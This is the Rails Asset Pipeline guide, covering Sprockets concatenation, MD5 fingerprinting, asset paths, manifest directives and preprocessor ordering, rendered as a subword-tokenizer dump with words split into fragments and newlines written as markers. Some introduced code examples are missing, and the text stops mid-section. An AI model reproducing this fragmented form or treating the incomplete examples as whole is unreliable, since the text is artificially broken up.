▁Sprockets ▁concatenate s ▁all ▁JavaScript ▁files ▁into ▁one ▁master ▁` . js ` ▁file ▁and ▁all < n > CSS ▁files ▁into ▁one ▁master ▁` . css ` ▁file .
▁As ▁you ' ll ▁learn ▁later ▁in ▁this ▁guide , ▁you < n > can ▁customize ▁this ▁strategy ▁to ▁group ▁files ▁any ▁way ▁you ▁like .
▁In ▁production ,< n > Rails ▁insert s ▁an ▁M D 5 ▁fingerprint ▁into ▁each ▁filename ▁so ▁that ▁the ▁file ▁is ▁cached < n > by ▁the ▁web ▁browser .
▁You ▁can ▁in validate ▁the ▁cache ▁by ▁alter ing ▁this ▁fingerprint ,< n > which ▁happens ▁automatically ▁when ever ▁you ▁change ▁the ▁file ▁contents .
▁The ▁second ▁feature ▁of ▁the ▁asset ▁pipeline ▁is ▁asset ▁ mini f ic ation ▁or ▁compression . < n >
▁For ▁CSS ▁files , ▁this ▁is ▁done ▁by ▁remov ing ▁whitespace ▁and ▁comments .
▁For ▁JavaScript ,< n > more ▁complex ▁process es ▁can ▁be ▁applied .
▁You ▁can ▁choose ▁from ▁a ▁set ▁of ▁built ▁in < n > options ▁or ▁specify ▁your ▁own .
▁The ▁third ▁feature ▁of ▁the ▁asset ▁pipeline ▁is ▁it ▁allows ▁ coding ▁assets ▁via ▁a < n > high er - level ▁language , ▁with ▁pre com p il ation ▁down ▁to ▁the ▁actual ▁assets .
▁Support ed < n > language s ▁include ▁Sass ▁for ▁CSS , ▁CoffeeScript ▁for ▁JavaScript , ▁and ▁ERB ▁for ▁both ▁by < n > default .
▁### ▁What ▁is ▁F ing er print ing ▁and ▁W h y ▁S h o ul d ▁I ▁C a re ?
▁F ing er print ing ▁is ▁a ▁technique ▁that ▁make s ▁the ▁name ▁of ▁a ▁file ▁ dependent ▁on ▁the < n > content s ▁of ▁the ▁file .
▁When ▁the ▁file ▁contents ▁change , ▁the ▁filename ▁is ▁also < n > change d .
▁For ▁content ▁that ▁is ▁static ▁or ▁in f r equ ent ly ▁changed , ▁this ▁provides ▁an < n > e as y ▁way ▁to ▁tell ▁whether ▁two ▁versions ▁of ▁a ▁file ▁are ▁identical , ▁even ▁across < n > different ▁server s ▁or ▁deployment ▁date s .
▁When ▁a ▁filename ▁is ▁unique ▁and ▁base d ▁on ▁its ▁content , ▁HTTP ▁headers ▁can ▁be ▁set ▁to < n > en c our age ▁cache s ▁every where ▁( w hether ▁at ▁CDN s , ▁at ▁I S P s , ▁in ▁network ing ▁equip ment ,< n > or ▁in ▁web ▁browsers ) ▁to ▁keep ▁their ▁own ▁copy ▁of ▁the ▁content .
▁When ▁the ▁content ▁is < n > updated , ▁the ▁fingerprint ▁will ▁change .
▁This ▁will ▁cause ▁the ▁remote ▁clients ▁to < n > request ▁a ▁new ▁copy ▁of ▁the ▁content .
▁This ▁is ▁generally ▁known ▁as ▁ _ cache ▁b us ting _ .
▁The ▁technique ▁ sprockets ▁uses ▁for ▁fingerprint ing ▁is ▁to ▁insert ▁a ▁hash ▁of ▁the < n > content ▁into ▁the ▁name , ▁usually ▁at ▁the ▁end .
▁For ▁example ▁a ▁CSS ▁file ▁` g lo b al . css `
▁g lo b al - 9 08 e 2 5 f 4 b f 64 18 68 d 8 68 3022 a 5 b 6 2 f 5 4 . css
▁This ▁is ▁the ▁strategy ▁a do p t ed ▁by ▁the ▁Rails ▁asset ▁pipeline .
▁Rails ' ▁old ▁strategy ▁was ▁to ▁app end ▁a ▁date - base d ▁query ▁string ▁to ▁every ▁asset ▁link ed < n > with ▁a ▁built - in ▁helper .
▁In ▁the ▁source ▁the ▁generated ▁code ▁look ed ▁like ▁this :
▁The ▁query ▁string ▁strategy ▁has ▁sever al ▁d is ad v ant age s :
▁** N o t ▁all ▁cache s ▁will ▁re li ably ▁cache ▁content ▁where ▁the ▁filename ▁only ▁differ s ▁by < n > query ▁parameters **
▁[ S t e ve ▁So u d ers ▁recommend s ]( http :// www . st e ve so u d ers . com / blog / 200 8 / 08 / 23 / re v v ing - filename s - do n t - use - query string / ), < n > ▁" . . . a v o id ing ▁a ▁query string ▁for ▁cache able ▁resources ".
▁H e ▁found ▁that ▁in ▁this < n > case ▁5 - 20 % ▁of ▁requests ▁will ▁not ▁be ▁cached .
▁ Query ▁strings ▁in ▁particular ▁do ▁not < n > work ▁at ▁all ▁with ▁some ▁CDN s ▁for ▁cache ▁in validation .
▁** The ▁file ▁name ▁can ▁change ▁between ▁ n ode s ▁in ▁ multi - server ▁environments .
▁The ▁default ▁query ▁string ▁in ▁Rails ▁2 . x ▁is ▁base d ▁on ▁the ▁modification ▁time ▁of < n > the ▁files .
▁When ▁assets ▁are ▁deploy ed ▁to ▁a ▁cl us ter , ▁there ▁is ▁no ▁guarantee ▁that ▁the < n > timestamp s ▁will ▁be ▁the ▁same , ▁result ing ▁in ▁different ▁values ▁being ▁used ▁depending < n > on ▁which ▁server ▁handle s ▁the ▁request .
▁** T oo ▁much ▁cache ▁in validation **
▁When ▁static ▁assets ▁are ▁deploy ed ▁with ▁each ▁new ▁release ▁of ▁code , ▁the ▁m time < n > ( time ▁of ▁last ▁modification ) ▁of ▁ _ all _ ▁these ▁files ▁changes , ▁for c ing ▁all ▁remote < n > client s ▁to ▁fetch ▁them ▁again , ▁even ▁when ▁the ▁content ▁of ▁those ▁assets ▁has ▁not ▁changed .
▁F ing er print ing ▁fix es ▁these ▁problem s ▁by ▁avoid ing ▁query ▁strings , ▁and ▁by ▁ en s ur ing < n > that ▁filename s ▁are ▁consistent ▁base d ▁on ▁their ▁content .
▁F ing er print ing ▁is ▁enabled ▁by ▁default ▁for ▁production ▁and ▁disable d ▁for ▁all ▁other < n > environments .
▁You ▁can ▁enable ▁or ▁disable ▁it ▁in ▁your ▁configuration ▁through ▁the < n >` config . assets . digest ` ▁option .
▁More ▁reading :
▁* ▁[ O p t i m ize ▁caching ]( http :// code . google . com / s p e ed / page - s p e ed / doc s / caching . html )
▁* ▁[ Re v v ing ▁File name s : ▁don ' t ▁use ▁query string ]( http :// www . st e ve so u d ers . com / blog / 200 8 / 08 / 23 / re v v ing - filename s - do n t - use - query string / )
▁How ▁to ▁Use ▁the ▁ Asset ▁Pipeline
▁In ▁previous ▁versions ▁of ▁Rails , ▁all ▁assets ▁were ▁located ▁in ▁subdirectories ▁of < n >` public ` ▁such ▁as ▁` images `, ▁` javascripts ` ▁and ▁` stylesheets `.
▁With ▁the ▁asset < n > pipeline , ▁the ▁preferred ▁location ▁for ▁these ▁assets ▁is ▁now ▁the ▁` app / assets `< n > directory .
▁File s ▁in ▁this ▁directory ▁are ▁served ▁by ▁the ▁Sprockets ▁middleware .
▁ Asset s ▁can ▁ still ▁be ▁placed ▁in ▁the ▁` public ` ▁hierarchy .
▁You ▁should ▁use ▁` app / assets ` ▁for < n > file s ▁that ▁must ▁under go ▁some ▁pre - process ing ▁before ▁they ▁are ▁served .
▁In ▁production , ▁Rails ▁ precompile s ▁these ▁files ▁to ▁` public / assets ` ▁by ▁default .
▁The < n > precompile d ▁copie s ▁are ▁the n ▁served ▁as ▁static ▁assets ▁by ▁the ▁web ▁server .
▁The ▁files < n > in ▁` app / assets ` ▁are ▁ never ▁served ▁directly ▁in ▁production .
▁### ▁Controller ▁ Specific ▁ Asset s
▁When ▁you ▁generate ▁a ▁scaffold ▁or ▁a ▁controller , ▁Rails ▁also ▁generates ▁a ▁JavaScript < n > file ▁( or ▁CoffeeScript ▁file ▁if ▁the ▁` coffee - rails ` ▁gem ▁is ▁in ▁the ▁` Gemfile `) ▁and ▁a < n > C as ca d ing ▁S t y le ▁S h e et ▁file ▁( or ▁SCSS ▁file ▁if ▁` sass - rails ` ▁is ▁in ▁the ▁` Gemfile ` )< n > for ▁that ▁controller .
▁Add it ion ally , ▁when ▁ generating ▁a ▁scaffold , ▁Rails ▁generates < n > the ▁file ▁scaffold s . css ▁( or ▁scaffold s . css . scss ▁if ▁` sass - rails ` ▁is ▁in ▁the < n >` Gemfile ` .)
▁For ▁example , ▁if ▁you ▁generate ▁a ▁` Pro j ec t sController `, ▁Rails ▁will ▁also ▁add ▁a ▁new < n > file ▁at ▁` app / assets / javascripts / projects . js . coffee ` ▁and ▁another ▁at < n >` app / assets / stylesheets / projects . css . scss `.
▁By ▁default ▁these ▁files ▁will ▁be ▁ready < n > to ▁use ▁by ▁your ▁application ▁immediately ▁using ▁the ▁` require _ tree ` ▁directive .
▁See < n >[ M an if est ▁File s ▁and ▁D ir ec tive s ](# ma n if est - file s - and - d ir ec tive s ) ▁for ▁more ▁details < n > on ▁require _ tree .
▁You ▁can ▁also ▁opt ▁to ▁include ▁controller ▁specific ▁stylesheets ▁and ▁JavaScript ▁files < n > only ▁in ▁their ▁respective ▁controllers ▁using ▁the ▁following :
▁` <%= ▁javascript _ include _ tag ▁params [: controller ] ▁%> ` ▁or ▁` <%= ▁stylesheet _ link _ tag < n > params [: controller ] ▁%> `
▁When ▁doing ▁this , ▁ensure ▁you ▁are ▁not ▁using ▁the ▁` require _ tree ` ▁directive , ▁as ▁that < n > will ▁result ▁in ▁your ▁assets ▁being ▁included ▁more ▁than ▁once .
▁WARNING : ▁When ▁using ▁asset ▁pre com p il ation , ▁you ▁will ▁need ▁to ▁ensure ▁that ▁your < n > controller ▁assets ▁will ▁be ▁pre compiled ▁when ▁load ing ▁them ▁on ▁a ▁per ▁page ▁basis .
▁By < n > default ▁ . coffee ▁and ▁ . scss ▁files ▁will ▁not ▁be ▁pre compiled ▁on ▁their ▁own .
▁See < n >[ P re com p il ing ▁ Asset s ](# pre com p il ing - assets ) ▁for ▁more ▁information ▁on ▁how < n > pre com p il ing ▁works .
▁NOTE : ▁You ▁must ▁have ▁an ▁ Ex ec JS ▁supported ▁runtime ▁in ▁order ▁to ▁use ▁CoffeeScript . < n >
▁If ▁you ▁are ▁using ▁Mac ▁OS ▁ X ▁or ▁Windows , ▁you ▁have ▁a ▁JavaScript ▁runtime ▁installed ▁in < n > your ▁operat ing ▁system .
▁You ▁can ▁also ▁disable ▁generation ▁of ▁controller ▁specific ▁asset ▁files ▁by ▁adding ▁the < n > following ▁to ▁your ▁` config / application . rb ` ▁configuration :
▁config . generator s ▁do ▁| g |
▁g . assets ▁false
▁### ▁ Asset ▁Or g an i z ation
▁Pipeline ▁assets ▁can ▁be ▁placed ▁inside ▁an ▁application ▁in ▁one ▁of ▁three ▁location s : < n >` app / assets `, ▁` lib / assets ` ▁or ▁` vendor / assets `.
▁* ▁` app / assets ` ▁is ▁for ▁assets ▁that ▁are ▁own ed ▁by ▁the ▁application , ▁such ▁as ▁custom < n > images , ▁JavaScript ▁files ▁or ▁stylesheets .
▁* ▁` lib / assets ` ▁is ▁for ▁your ▁own ▁libraries ' ▁code ▁that ▁does n ' t ▁really ▁fit ▁into ▁the < n > scope ▁of ▁the ▁application ▁or ▁those ▁libraries ▁which ▁are ▁ shared ▁across ▁applications .
▁* ▁` vendor / assets ` ▁is ▁for ▁assets ▁that ▁are ▁own ed ▁by ▁outside ▁ ent it ies , ▁such ▁as < n > code ▁for ▁JavaScript ▁plugin s ▁and ▁CSS ▁frameworks .
▁WARNING : ▁If ▁you ▁are ▁upgrading ▁from ▁Rails ▁3 , ▁please ▁take ▁into ▁account ▁that ▁assets < n > un d er ▁` lib / assets ` ▁or ▁` vendor / assets ` ▁are ▁available ▁for ▁inclusion ▁via ▁the < n > application ▁manifest s ▁but ▁no ▁longer ▁part ▁of ▁the ▁ precompile ▁array .
▁See < n >[ P re com p il ing ▁ Asset s ](# pre com p il ing - assets ) ▁for ▁ guid ance .
▁#### ▁S e ar ch ▁Path s
▁When ▁a ▁file ▁is ▁referenced ▁from ▁a ▁manifest ▁or ▁a ▁helper , ▁Sprockets ▁search es ▁the < n > th re e ▁default ▁asset ▁location s ▁for ▁it .
▁The ▁default ▁location s ▁are : ▁the ▁` images `, ▁` javascripts ` ▁and ▁` stylesheets `< n > d ir ec to r ies ▁under ▁the ▁` app / assets ` ▁folder , ▁but ▁these ▁subdirectories < n > a re ▁not ▁special ▁- ▁any ▁path ▁under ▁` assets / * ` ▁will ▁be ▁search ed .
▁For ▁example , ▁these ▁files :
▁app / assets / javascripts / home . js
▁ lib / assets / javascripts / m oo v in at or . js
▁ vendor / assets / javascripts / s li d er . js
▁ vendor / assets / some p ac k age / phone box . js
▁would ▁be ▁referenced ▁in ▁a ▁manifest ▁like ▁this :
▁`` ` js
▁ //= ▁require ▁home
▁ //= ▁require ▁m oo v in at or
▁ //= ▁require ▁ s li d er
▁ //= ▁require ▁ phone box
▁ Asset s ▁inside ▁subdirectories ▁can ▁also ▁be ▁access ed .
▁app / assets / javascripts / sub / something . js
▁is ▁referenced ▁as :
▁ //= ▁require ▁sub / something
▁You ▁can ▁view ▁the ▁search ▁path ▁by ▁ inspect ing < n >` Rails . application . config . assets . path s ` ▁in ▁the ▁Rails ▁console .
▁Be side s ▁the ▁standard ▁` assets / * ` ▁paths , ▁ additional ▁( full y ▁ qualified ) ▁paths ▁can ▁be < n > add ed ▁to ▁the ▁pipeline ▁in ▁` config / application . rb `.
▁For ▁example :
▁config . assets . path s ▁< < ▁Rails . root . join (" lib ", ▁" video play er ", ▁" flash ")
▁Path s ▁are ▁tr a v ers ed ▁in ▁the ▁order ▁they ▁occur ▁in ▁the ▁search ▁path .
▁By ▁default ,< n > this ▁means ▁the ▁files ▁in ▁` app / assets ` ▁take ▁precedence , ▁and ▁will ▁m as k < n > corresponding ▁paths ▁in ▁` lib ` ▁and ▁` vendor `.
▁#### ▁Using ▁Inde x ▁File s
▁Sprockets ▁uses ▁files ▁named ▁` index ` ▁( with ▁the ▁relevant ▁extensions ) ▁for ▁a ▁special < n > p urpose .
▁For ▁example , ▁if ▁you ▁have ▁a ▁jQuery ▁library ▁with ▁many ▁module s , ▁which ▁is ▁store d ▁in < n >` lib / assets / javascripts / lib r ary _ name `, ▁the ▁file ▁` lib / assets / javascripts / lib r ary _ name / index . js ` ▁serve s ▁as < n > the ▁manifest ▁for ▁all ▁files ▁in ▁this ▁library .
▁This ▁file ▁could ▁include ▁a ▁list ▁of < n > all ▁the ▁required ▁files ▁in ▁order , ▁or ▁a ▁simple ▁` require _ tree ` ▁directive .
▁The ▁library ▁as ▁a ▁whole ▁can ▁be ▁access ed ▁in ▁the ▁application ▁manifest ▁like ▁so :
▁ //= ▁require ▁library _ name
▁This ▁simplif ies ▁ maintenance ▁and ▁keep s ▁things ▁clean ▁by ▁allow ing ▁related ▁code ▁to < n > be ▁group ed ▁before ▁inclusion ▁else where .
▁### ▁Co d ing ▁Link s ▁to ▁ Asset s
▁Sprockets ▁does ▁not ▁add ▁any ▁new ▁methods ▁to ▁access ▁your ▁assets ▁- ▁you ▁ still ▁use ▁the < n > familiar ▁` javascript _ include _ tag ` ▁and ▁` stylesheet _ link _ tag ` :
▁<%= ▁stylesheet _ link _ tag ▁" application ", ▁m edia : ▁" all " ▁%>
▁<%= ▁javascript _ include _ tag ▁" application " ▁%>
▁If ▁using ▁the ▁ turbolinks ▁gem , ▁which ▁is ▁included ▁by ▁default ▁in ▁Rails ▁4 , ▁the n < n > include ▁the ▁' data - turbolinks - t rack ' ▁option ▁which ▁cause s ▁ turbolinks ▁to ▁check ▁if < n > an ▁asset ▁has ▁been ▁updated ▁and ▁if ▁so ▁load s ▁it ▁into ▁the ▁page :
▁<%= ▁stylesheet _ link _ tag ▁" application ", ▁m edia : ▁" all ", ▁" data - turbolinks - t rack " ▁=> ▁true ▁%>
▁<%= ▁javascript _ include _ tag ▁" application ", ▁" data - turbolinks - t rack " ▁=> ▁true ▁%>
▁In ▁regular ▁views ▁you ▁can ▁access ▁images ▁in ▁the ▁` public / assets / images ` ▁directory < n > like ▁this :
▁<%= ▁image _ tag ▁" rails . png " ▁%>
▁Provide d ▁that ▁the ▁pipeline ▁is ▁enabled ▁within ▁your ▁application ▁( and ▁not ▁disable d < n > in ▁the ▁current ▁environment ▁context ), ▁this ▁file ▁is ▁served ▁by ▁Sprockets .
▁If ▁a ▁file < n > exists ▁at ▁` public / assets / rails . png ` ▁it ▁is ▁served ▁by ▁the ▁web ▁server .
▁A lternatively , ▁a ▁request ▁for ▁a ▁file ▁with ▁an ▁M D 5 ▁hash ▁such ▁as < n >` public / assets / rails - a f 27 b 6 a 4 1 4 e 6 d a 0000 3 50 3 1 4 8 be 9 b 4 0 9 . png ` ▁is ▁treat ed ▁the ▁same < n > way .
▁How ▁these ▁hashes ▁are ▁generated ▁is ▁covered ▁in ▁the ▁[ In < n > Product ion ](# in - production ) ▁section ▁later ▁on ▁in ▁this ▁guide .
▁Sprockets ▁will ▁also ▁look ▁through ▁the ▁paths ▁specified ▁in ▁` config . assets . path s `, < n > which ▁includes ▁the ▁standard ▁application ▁paths ▁and ▁any ▁paths ▁added ▁by ▁Rails < n > engine s .
▁Imag es ▁can ▁also ▁be ▁ org an ize d ▁into ▁subdirectories ▁if ▁required , ▁and ▁the n ▁can ▁be < n > access ed ▁by ▁specify ing ▁the ▁directory ' s ▁name ▁in ▁the ▁tag :
▁WARNING : ▁If ▁you ' re ▁pre com p il ing ▁your ▁assets ▁( see ▁[ In ▁ Product ion ](# in - production )< n > be low ), ▁link ing ▁to ▁an ▁asset ▁that ▁does ▁not ▁exist ▁will ▁raise ▁an ▁exception ▁in ▁the < n > c all ing ▁page .
▁This ▁includes ▁link ing ▁to ▁a ▁blank ▁string .
▁As ▁such , ▁be ▁careful ▁using < n >` image _ tag ` ▁and ▁the ▁other ▁helpers ▁with ▁user - s up p li ed ▁data .
▁#### ▁CSS ▁and ▁ERB
▁The ▁asset ▁pipeline ▁automatically ▁evaluate s ▁ERB .
▁This ▁means ▁if ▁you ▁add ▁an < n >` erb ` ▁extension ▁to ▁a ▁CSS ▁asset ▁( for ▁example , ▁` application . css . erb ` ), ▁the n < n > helpers ▁like ▁` asset _ path ` ▁are ▁available ▁in ▁your ▁CSS ▁rules :
▁`` ` css
▁ . class ▁ { ▁background - image : ▁url ( <%= ▁asset _ path ▁' image . png ' ▁%> ) ▁ }
▁This ▁write s ▁the ▁path ▁to ▁the ▁particular ▁asset ▁being ▁referenced .
▁In ▁this ▁example ,< n > it ▁would ▁make ▁sense ▁to ▁have ▁an ▁image ▁in ▁one ▁of ▁the ▁asset ▁load ▁paths , ▁such ▁as < n >` app / assets / images / image . png `, ▁which ▁would ▁be ▁referenced ▁here .
▁If ▁this ▁image ▁is < n > already ▁available ▁in ▁` public / assets ` ▁as ▁a ▁fingerprint ed ▁file , ▁the n ▁that ▁path ▁is < n > reference d .
▁If ▁you ▁want ▁to ▁use ▁a ▁[ data ▁U R I ]( http :// en . wiki p edia . org / wiki / Data _ U R I _ scheme ) ▁- < n > a ▁method ▁of ▁embed d ing ▁the ▁image ▁data ▁directly ▁into ▁the ▁CSS ▁file ▁- ▁you ▁can ▁use < n > the ▁` asset _ data _ ur i ` ▁helper .
▁# logo ▁ { ▁background : ▁url ( <%= ▁asset _ data _ ur i ▁' logo . png ' ▁%> ) ▁ }
▁This ▁insert s ▁a ▁correctly - formatted ▁data ▁U R I ▁into ▁the ▁CSS ▁source .
▁Note ▁that ▁the ▁ closing ▁tag ▁cannot ▁be ▁of ▁the ▁style ▁` - % >` .
▁#### ▁CSS ▁and ▁Sass
▁When ▁using ▁the ▁asset ▁pipeline , ▁paths ▁to ▁assets ▁must ▁be ▁re - written ▁and < n >` sass - rails ` ▁provides ▁` - url ` ▁and ▁` - path ` ▁helpers ▁( h y ph en at ed ▁in ▁Sass ,< n > underscore d ▁in ▁Ruby ) ▁for ▁the ▁following ▁asset ▁classes : ▁image , ▁font , ▁video , ▁ audio ,< n > JavaScript ▁and ▁stylesheet .
▁* ▁` image - url (" rails . png ") ` ▁becomes ▁` url ( / assets / rails . png )`
▁* ▁` image - path (" rails . png ") ` ▁becomes ▁` " / assets / rails . png " `.
▁The ▁more ▁generic ▁form ▁can ▁also ▁be ▁used :
▁* ▁` asset - url (" rails . png ") ` ▁becomes ▁` url ( / assets / rails . png )`
▁* ▁` asset - path (" rails . png ") ` ▁becomes ▁` " / assets / rails . png " `
▁#### ▁JavaScript / Co ff e e S c r ip t ▁and ▁ERB
▁If ▁you ▁add ▁an ▁` erb ` ▁extension ▁to ▁a ▁JavaScript ▁asset , ▁making ▁it ▁something ▁such ▁as < n >` application . js . erb `, ▁you ▁can ▁the n ▁use ▁the ▁` asset _ path ` ▁helper ▁in ▁your < n > JavaScript ▁code :
▁ $ (' # logo ' ). attr ( { ▁src : ▁" <%= ▁asset _ path (' logo . png ') ▁%> " ▁ }) ;
▁This ▁write s ▁the ▁path ▁to ▁the ▁particular ▁asset ▁being ▁referenced . < n >< n >
▁ $ (' # logo ' ). attr ▁src : ▁" <%= ▁asset _ path (' logo . png ') ▁%> "
▁### ▁M an if est ▁File s ▁and ▁D ir ec tive s
▁Sprockets ▁uses ▁manifest ▁files ▁to ▁determine ▁which ▁assets ▁to ▁include ▁and ▁serve . < n >
▁These ▁manifest ▁files ▁contain ▁ _ d ir ec tive s _ ▁- ▁instructions ▁that ▁tell ▁Sprockets < n > which ▁files ▁to ▁require ▁in ▁order ▁to ▁build ▁a ▁single ▁CSS ▁or ▁JavaScript ▁file .
▁By ▁serving < n > one ▁file ▁rather ▁than ▁many , ▁the ▁load ▁time ▁of ▁pages ▁can ▁be ▁great ly ▁reduce d ▁because < n > the ▁browser ▁make s ▁few er ▁requests .
▁Co mp re s s ion ▁also ▁reduce s ▁file ▁size , ▁ en a b l ing < n > the ▁browser ▁to ▁ download ▁them ▁faster .
▁For ▁example , ▁a ▁new ▁Rails ▁4 ▁application ▁includes ▁a ▁default < n >` app / assets / javascripts / application . js ` ▁file ▁containing ▁the ▁following ▁lines :
▁/ / ▁...
▁ //= ▁require ▁ jquery
▁ //= ▁require ▁ jquery _ u js
▁ //= ▁require _ tree ▁ .
▁In ▁JavaScript ▁files , ▁Sprockets ▁directive s ▁begin ▁with ▁` //= `.
▁In ▁the ▁above ▁case ,< n > the ▁file ▁is ▁using ▁the ▁` require ` ▁and ▁the ▁` require _ tree ` ▁directive s .
▁The ▁` require `< n > d ir ec tive ▁is ▁used ▁to ▁tell ▁Sprockets ▁the ▁files ▁you ▁wish ▁to ▁require .
▁Here , ▁you ▁are < n > requiring ▁the ▁files ▁` jquery . js ` ▁and ▁` jquery _ u js . js ` ▁that ▁are ▁available ▁some where < n > in ▁the ▁search ▁path ▁for ▁Sprockets .
▁You ▁need ▁not ▁supply ▁the ▁extensions ▁explicitly . < n >
▁Sprockets ▁assume s ▁you ▁are ▁requiring ▁a ▁` . js ` ▁file ▁when ▁done ▁from ▁within ▁a ▁` . js `< n > file .
▁The ▁` require _ tree ` ▁directive ▁tell s ▁Sprockets ▁to ▁ recursive ly ▁include ▁ _ all _ < n > JavaScript ▁files ▁in ▁the ▁specified ▁directory ▁into ▁the ▁output .
▁These ▁paths ▁must ▁be < n > spec if i ed ▁relative ▁to ▁the ▁manifest ▁file .
▁You ▁can ▁also ▁use ▁the < n >` require _ directory ` ▁directive ▁which ▁includes ▁all ▁JavaScript ▁files ▁only ▁in ▁the < n > directory ▁specified , ▁without ▁re c ur s ion .
▁D ir ec tive s ▁are ▁processed ▁to p ▁to ▁bottom , ▁but ▁the ▁order ▁in ▁which ▁files ▁are < n > include d ▁by ▁` require _ tree ` ▁is ▁un spec if i ed .
▁You ▁should ▁not ▁rely ▁on ▁any ▁particular < n > order ▁a mong ▁those .
▁If ▁you ▁need ▁to ▁ensure ▁some ▁particular ▁JavaScript ▁end s ▁up < n > a b o ve ▁some ▁other ▁in ▁the ▁concatenate d ▁file , ▁require ▁the ▁pre r equ i site ▁file ▁first < n > in ▁the ▁manifest .
▁Note ▁that ▁the ▁f am ily ▁of ▁` require ` ▁directive s ▁prevent s ▁files < n > from ▁being ▁included ▁t w ic e ▁in ▁the ▁output .
▁Rails ▁also ▁creates ▁a ▁default ▁` app / assets / stylesheets / application . css ` ▁file < n > which ▁contains ▁these ▁lines :
▁/ * ▁...
▁* = ▁require _ self
▁* = ▁require _ tree ▁ .
▁Rails ▁4 ▁creates ▁both ▁` app / assets / javascripts / application . js ` ▁and < n >` app / assets / stylesheets / application . css ` ▁regardless ▁of ▁whether ▁the < n > - - skip - sprockets ▁option ▁is ▁used ▁when ▁creating ▁a ▁new ▁rails ▁application .
▁This ▁is < n > so ▁you ▁can ▁easily ▁add ▁asset ▁p ip el in ing ▁later ▁if ▁you ▁like .
▁The ▁directive s ▁that ▁work ▁in ▁JavaScript ▁files ▁also ▁work ▁in ▁stylesheets < n > ( th ough ▁obvious ly ▁including ▁stylesheets ▁rather ▁than ▁JavaScript ▁files ).
▁The < n >` require _ tree ` ▁directive ▁in ▁a ▁CSS ▁manifest ▁works ▁the ▁same ▁way ▁as ▁the ▁JavaScript < n > one , ▁requiring ▁all ▁stylesheets ▁from ▁the ▁current ▁directory .
▁In ▁this ▁example , ▁` require _ self ` ▁is ▁used .
▁This ▁put s ▁the ▁CSS ▁contain ed ▁within ▁the < n > file ▁( if ▁any ) ▁at ▁the ▁precise ▁location ▁of ▁the ▁` require _ self ` ▁call .
▁NOTE . ▁If ▁you ▁want ▁to ▁use ▁multiple ▁Sass ▁files , ▁you ▁should ▁generally ▁use ▁the ▁[ S as s ▁`@ import ` ▁rule ]( http :// sass - lang . com / doc s / y a rdoc / file . S A SS _ RE F ER E N C E . html # import )< n > instead ▁of ▁these ▁Sprockets ▁directive s .
▁When ▁using ▁Sprockets ▁directive s , ▁Sass ▁files ▁exist ▁within < n > the ir ▁own ▁scope , ▁making ▁variables ▁or ▁ mixin s ▁only ▁available ▁within ▁the ▁document ▁they ▁were ▁defined ▁in .
▁You ▁can ▁do ▁file ▁g lo b b ing ▁as ▁well ▁using ▁`@ import ▁" * " `, ▁and ▁`@ import ▁" ** / * " ` ▁to ▁add ▁the ▁whole ▁ tree ▁which ▁is ▁equivalent ▁to ▁how ▁` require _ tree ` ▁works .
▁Check ▁the ▁[ sass - rails ▁documentation ]( https :// github . com / rails / sass - rails # feature s ) ▁for ▁more ▁ info ▁and ▁important ▁caveat s .
▁You ▁can ▁have ▁as ▁many ▁manifest ▁files ▁as ▁you ▁need .
▁For ▁example , ▁the ▁` admin . css `< n > and ▁` admin . js ` ▁manifest ▁could ▁contain ▁the ▁ JS ▁and ▁CSS ▁files ▁that ▁are ▁used ▁for ▁the < n > admin ▁section ▁of ▁an ▁application .
▁The ▁same ▁re m ar k s ▁about ▁order ing ▁made ▁above ▁apply .
▁In ▁particular , ▁you ▁can ▁specify < n > in div id u al ▁files ▁and ▁they ▁are ▁ compiled ▁in ▁the ▁order ▁specified .
▁For ▁example , ▁you < n > m ight ▁concatenate ▁three ▁CSS ▁files ▁together ▁this ▁way :
▁* = ▁require ▁reset
▁* = ▁require ▁layout
▁* = ▁require ▁ ch r o me
▁### ▁P re process ing
▁The ▁file ▁extensions ▁used ▁on ▁an ▁asset ▁determine ▁what ▁pre process ing ▁is ▁applied . < n >
▁When ▁a ▁controller ▁or ▁a ▁scaffold ▁is ▁generated ▁with ▁the ▁default ▁Rails ▁gem set , ▁a < n > Co ff e e S c r ip t ▁file ▁and ▁a ▁SCSS ▁file ▁are ▁generated ▁in ▁place ▁of ▁a ▁regular ▁JavaScript < n > and ▁CSS ▁file .
▁The ▁example ▁used ▁before ▁was ▁a ▁controller ▁called ▁" projects ", ▁which < n > generated ▁an ▁` app / assets / javascripts / projects . js . coffee ` ▁and ▁an < n >` app / assets / stylesheets / projects . css . scss ` ▁file .
▁In ▁development ▁mode , ▁or ▁if ▁the ▁asset ▁pipeline ▁is ▁disable d , ▁when ▁these ▁files ▁are < n > request ed ▁they ▁are ▁processed ▁by ▁the ▁process or s ▁provided ▁by ▁the ▁` coffee - script `< n > and ▁` sass ` ▁gems ▁and ▁the n ▁sent ▁back ▁to ▁the ▁browser ▁as ▁JavaScript ▁and ▁CSS < n > re spec tive ly .
▁When ▁asset ▁p ip el in ing ▁is ▁enabled , ▁these ▁files ▁are ▁pre process ed ▁and < n > place d ▁in ▁the ▁` public / assets ` ▁directory ▁for ▁serving ▁by ▁either ▁the ▁Rails ▁app ▁or < n > web ▁server .
▁Add it ion al ▁layer s ▁of ▁pre process ing ▁can ▁be ▁request ed ▁by ▁adding ▁other ▁extensions ,< n > where ▁each ▁extension ▁is ▁processed ▁in ▁a ▁right - to - le f t ▁m an n er .
▁These ▁should ▁be < n > us ed ▁in ▁the ▁order ▁the ▁process ing ▁should ▁be ▁applied .
▁For ▁example , ▁a ▁stylesheet < n > called ▁` app / assets / stylesheets / projects . css . scss . erb ` ▁is ▁first ▁processed ▁as ▁ERB ,< n > the n ▁SCSS , ▁and ▁finally ▁served ▁as ▁CSS . ▁The ▁same ▁applies ▁to ▁a ▁JavaScript ▁file ▁- < n >` app / assets / javascripts / projects . js . coffee . erb ` ▁is ▁processed ▁as ▁ERB , ▁the n < n > Co ff e e S c r ip t , ▁and ▁served ▁as ▁JavaScript .
▁ K eep ▁in ▁mind ▁the ▁order ▁of ▁these ▁pre process or s ▁is ▁important .
▁For ▁example , ▁if < n > you ▁called ▁your ▁JavaScript ▁file ▁` app / assets / javascripts / projects . js . erb . coffee `< n > the n ▁it ▁would ▁be ▁processed ▁with ▁the ▁CoffeeScript ▁interpret er ▁first , ▁which < n > w o ul d n ' t ▁understand ▁ERB ▁and ▁therefore ▁you ▁would ▁run ▁into ▁problem s .
▁In ▁De ve lo p ment
▁In ▁development ▁mode , ▁assets ▁are ▁served ▁as ▁separate ▁files ▁in ▁the ▁order ▁they ▁are < n > spec if i ed ▁in ▁the ▁manifest ▁file .
▁This ▁manifest ▁` app / assets / javascripts / application . js ` :
▁ //= ▁require ▁core
